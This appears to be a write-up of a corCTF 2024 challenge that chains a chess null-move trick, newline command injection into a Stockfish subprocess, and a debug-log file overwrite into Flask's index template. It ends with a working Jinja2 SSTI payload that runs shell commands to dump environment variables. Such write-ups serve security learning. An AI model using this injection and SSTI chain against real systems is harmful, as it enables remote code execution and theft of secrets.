---
layout: post
title: "msFrogOfWar3 - corctf2024"
date: 2024-07-27 00:00:00
categories: writeups
tags: misc stockfish chess 2024
mathjax: false
---
* content
{:toc}
![Frog](../../../../images/frog.png)




431 points - 4 solves - First Blood!

**Author**: strellic, quintec

{: .note }
Writeup co-authored by [ky28059](https://gist.github.com/ky28059/2f279fff831a5be3d6b5fbb8a6d86057)

### Challenge Description
![Frog](../../../../images/frog.png)

We're given a Flask server that looks like this:
```py
from flask import Flask, request, render_template
from flask_socketio import SocketIO, emit
from stockfish import Stockfish
import random

import chess
from stockfish import Stockfish

games = {}

toxic_msges = [
    "?",
    "rip bozo",
    "so bad lmfaoo",
    "ez",
    "skill issue",
    "mad cuz bad",
    "hold this L",
    "L + ratio + you fell off",
    "i bet your main category is stego",
    "have you tried alt+f4?",
    "🤡🤡🤡"
]

win_msges = [
    "lmaooooooooo ur so bad",
    "was that it?",
    "zzzzzzzzzzzzzzzzzzzzzz",
    "hopefully the next game wont be so quick",
    "nice try - jk that was horrible",
    "this aint checkers man"
]

TURN_LIMIT = 15
STOCKFISH_DEPTH = 21
FLAG = "corctf{this_is_a_fake_flag}"

class GameWrapper:
    def __init__(self, emit):
        self.emit = emit
        self.board = chess.Board(chess.STARTING_FEN)
        self.moves = []
        self.player_turn = True

    def get_player_state(self):
        legal_moves = [f"{m}" for m in self.board.legal_moves] if self.player_turn and self.board.fullmove_number < TURN_LIMIT else []

        status = "running"
        if self.board.fullmove_number >= TURN_LIMIT:
            status = "turn limit"

        if outcome := self.board.outcome():
            if outcome.winner is None:
                status = "draw"
            else:
                status = "win" if outcome.winner == chess.WHITE else "lose"

        return {
            "pos": self.board.fen(),
            "moves": legal_moves,
            "your_turn": self.player_turn,
            "status": status,
            "turn_counter": f"{self.board.fullmove_number} / {TURN_LIMIT} turns"
        }

    def play_move(self, uci):
        if not self.player_turn:
            return
        if self.board.fullmove_number >= TURN_LIMIT:
            return
        
        self.player_turn = False

        outcome = self.board.outcome()
        if outcome is None:
            try:
                move = chess.Move.from_uci(uci)
                if move:
                    if move not in self.board.legal_moves:
                        self.player_turn = True
                        self.emit('state', self.get_player_state())
                        self.emit("chat", {"name": "System", "msg": "Illegal move"})
                        return
                    self.board.push_uci(uci)
            except:
                self.player_turn = True
                self.emit('state', self.get_player_state())
                self.emit("chat", {"name": "System", "msg": "Invalid move format"})
                return
        elif outcome.winner != chess.WHITE:
            self.emit("chat", {"name": "🐸", "msg": "you lost, bozo"})
            return

        self.moves.append(uci)

        # stockfish has a habit of crashing
        # The following section is used to try to resolve this
        opponent_move, attempts = None, 0
        while not opponent_move and attempts <= 10:
            try:
                attempts += 1
                engine = Stockfish("./stockfish/stockfish-ubuntu-x86-64-avx2", parameters={"Threads": 4}, depth=STOCKFISH_DEPTH)
                for m in self.moves:
                    if engine.is_move_correct(m):
                        engine.make_moves_from_current_position([m])
                opponent_move = engine.get_best_move_time(3_000)
            except:
                pass

        if opponent_move != None:
            self.moves.append(opponent_move)
            opponent_move = chess.Move.from_uci(opponent_move)
            if self.board.is_capture(opponent_move):
                self.emit("chat", {"name": "🐸", "msg": random.choice(toxic_msges)})
            self.board.push(opponent_move)
            self.player_turn = True
            self.emit("state", self.get_player_state())

            if (outcome := self.board.outcome()) is not None:
                if outcome.termination == chess.Termination.CHECKMATE:
                    if outcome.winner == chess.BLACK:
                        self.emit("chat", {"name": "🐸", "msg": "Nice try... but not good enough 🐸"})
                    else:
                        self.emit("chat", {"name": "🐸", "msg": "how??????"})
                        self.emit("chat", {"name": "System", "msg": FLAG})
                else: # statemate, insufficient material, etc
                    self.emit("chat", {"name": "🐸", "msg": "That was close... but still not good enough 🐸"})
        else:
            self.emit("chat", {"name": "System", "msg": "An error occurred, please restart"})

app = Flask(__name__, static_url_path='', static_folder='static')
socketio = SocketIO(app, cors_allowed_origins='*')

@app.after_request
def add_header(response):
    response.headers['Cache-Control'] = 'max-age=604800'
    return response

@app.route('/')
def index_route():
    return render_template('index.html')

@socketio.on('connect')
def on_connect(_):
    games[request.sid] = GameWrapper(emit)
    emit('state', games[request.sid].get_player_state())

@socketio.on('disconnect')
def on_disconnect():
    if request.sid in games:
        del games[request.sid]

@socketio.on('move')
def onmsg_move(move):
    try:
        games[request.sid].play_move(move)
    except:
        emit("chat", {"name": "System", "msg": "An error occurred, please restart"})

@socketio.on('state')
def onmsg_state():
    emit('state', games[request.sid].get_player_state())
```
At first glance, it looks like we need to win against Stockfish in 15 moves to get the flag.

Obviously, winning against max-difficulty Stockfish, much less in 15 moves, is impossible. Curiously, however, the server uses [python-chess](https://python-chess.readthedocs.io/en/latest/)'s `Move` class to verify game inputs. Reading the [source for `Move.from_uci`](https://github.com/niklasf/python-chess/blob/32253d6cfdbc1939f78f03892fa848412cf4b4fa/chess/__init__.py#L686),
```py
    @classmethod
    def from_uci(cls, uci: str) -> Move:
        """
        Parses a UCI string.

        :raises: :exc:`InvalidMoveError` if the UCI string is invalid.
        """
        if uci == "0000":
            return cls.null()
        elif len(uci) == 4 and "@" == uci[1]:
            try:
                drop = PIECE_SYMBOLS.index(uci[0].lower())
                square = SQUARE_NAMES.index(uci[2:])
            except ValueError:
                raise InvalidMoveError(f"invalid uci: {uci!r}")
            return cls(square, square, drop=drop)
        elif 4 <= len(uci) <= 5:
            try:
                from_square = SQUARE_NAMES.index(uci[0:2])
                to_square = SQUARE_NAMES.index(uci[2:4])
                promotion = PIECE_SYMBOLS.index(uci[4]) if len(uci) == 5 else None
            except ValueError:
                raise InvalidMoveError(f"invalid uci: {uci!r}")
            if from_square == to_square:
                raise InvalidMoveError(f"invalid uci (use 0000 for null moves): {uci!r}")
            return cls(from_square, to_square, promotion=promotion)
        else:
            raise InvalidMoveError(f"expected uci string to be of length 4 or 5: {uci!r}")
```
we can send a "null move" `0000` to pass the turn to Stockfish. Afterwards, Stockfish will play white and we will play black; all we need to do is get checkmated to "win"!

![image](https://gist.github.com/user-attachments/assets/8a765e88-8838-49ae-bc11-91094fc83f97)

```js
socket.emit('move', '0000')
socket.emit('move', 'f7f6')
socket.emit('move', 'g7g5')
```
Unfortunately, winning is only part one of the challenge; the flag printed to the chat is fake, and looking in `run-docker.sh`, the real flag lies in the `FLAG` environment variable passed to `docker run`:
```sh
#!/bin/sh
docker build . -t msfrogofwar3
docker run --rm -it -p 8080:8080 -e FLAG=corctf{real_flag} --name msfrogofwar3 msfrogofwar3
```
However, looking again at the `play_move` method in the game server,
```py
        outcome = self.board.outcome()
        if outcome is None:
            try:
                move = chess.Move.from_uci(uci)
                if move:
                    if move not in self.board.legal_moves:
                        self.player_turn = True
                        self.emit('state', self.get_player_state())
                        self.emit("chat", {"name": "System", "msg": "Illegal move"})
                        return
                    self.board.push_uci(uci)
            except:
                self.player_turn = True
                self.emit('state', self.get_player_state())
                self.emit("chat", {"name": "System", "msg": "Invalid move format"})
                return
        elif outcome.winner != chess.WHITE:
            self.emit("chat", {"name": "🐸", "msg": "you lost, bozo"})
            return

        self.moves.append(uci)
```
it looks like winning lets us push unchecked moves to `self.moves`, which then get passed to `engine.is_move_correct`:
```py
        while not opponent_move and attempts <= 10:
            try:
                attempts += 1
                engine = Stockfish("./stockfish/stockfish-ubuntu-x86-64-avx2", parameters={"Threads": 4}, depth=STOCKFISH_DEPTH)
                for m in self.moves:
                    if engine.is_move_correct(m):
                        engine.make_moves_from_current_position([m])
                opponent_move = engine.get_best_move_time(3_000)
```
The server uses the [stockfish](https://pypi.org/project/stockfish/) python library, which [uses a subprocess to launch and communicate with the Stockfish engine](https://github.com/zhelyabuzhsky/stockfish/blob/master/stockfish/models.py#L47-L53).
```py
        self._stockfish = subprocess.Popen(
            self._path,
            universal_newlines=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
```
Reading the stockfish library [source code for `is_move_correct`](https://github.com/zhelyabuzhsky/stockfish/blob/master/stockfish/models.py#L420),
```py
    def is_move_correct(self, move_value: str) -> bool:
        """Checks new move.

        Args:
            move_value:
              New move value in algebraic notation.

        Returns:
            True, if new move is correct, else False.
        """
        old_self_info = self.info
        self._put(f"go depth 1 searchmoves {move_value}")
        is_move_correct = self._get_best_move_from_sf_popen_process() is not None
        self.info = old_self_info
        return is_move_correct
```
```py
    def _put(self, command: str) -> None:
        if not self._stockfish.stdin:
            raise BrokenPipeError()
        if self._stockfish.poll() is None and not self._has_quit_command_been_sent:
            self._stockfish.stdin.write(f"{command}\n")
            self._stockfish.stdin.flush()
            if command == "quit":
                self._has_quit_command_been_sent = True
```
Therefore, by circumventing the move checking, we can control `move_value` and send arbitrary commands to the Stockfish process.

Stockfish documents its supported UCI commands and functionality [here](https://disservin.github.io/stockfish-docs/stockfish-wiki/UCI-&-Commands.html). Of particular note is
```
setoption name Debug Log File value [file path]
```
which causes Stockfish to log all incoming and outbound interactions to the specified file path. We can get a simple proof-of-concept attack by making Stockfish log to the configured Flask static dir:

![image](https://gist.github.com/user-attachments/assets/d2a5ca54-7c35-46d8-abcf-18a8d17792f8)

### Putting it all together

We now have the ability to write to any file and possibly overwrite the contents of that file. 

The source code gives hint to a vulnerable file.

```python
@app.route('/')
def index_route():
    return render_template('index.html')
```

By writing to `/app/templates/index.html` we can get flask to render whatever was in the debug log file as a 
template. 
{% raw %}
Anything between `{{` and `}}` will be evaluated as a template expression.
{% endraw %}
Flask caches templates, so we would want to start a new instance of the flask application, and not view the webpage just yet.

After starting an instance we can send our moves to the server manually using a common [flask ssti payload](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti) to run shell commands.
{% raw %}
```js
const socket = io("https://msfrogofwar3-uuid.be.ax"/);
socket.emit('move', '0000')
socket.emit('move', 'f7f6')
socket.emit('move', 'g7g5')
socket.emit('move', "e6e7\nsetoption name Debug Log File value /app/templates/index.html\n{{ ''.__class__.mro()[1].__subclasses__()[568]('env', shell=True, stdout=-1).communicate() }}\n")
```
{% endraw %}

{: .note }
Ensure you do not open the webpage until you have sent the payload, as the template will be cached and our custom debug log template will never be rendered.
{: .note }
Ensure you do not open the webpage until you have sent the payload, as the template will be cached and our custom debug log template will never be rendered.

This replaces the index.html template with the output of the command `env`. We can now view the webpage to see the output of the command giving us the flag.

{% raw %}
corctf{"Whatever you do, don't reveal all your techniques in a CTF challenge, you fool, you moron." - Sun Tzu, The Art of War}
{% endraw %}

### Summary

Overall this challenge only got four solves making it one of the harder..? challenges, and definitely one of the most unique. We got first blood after over 24 hours!
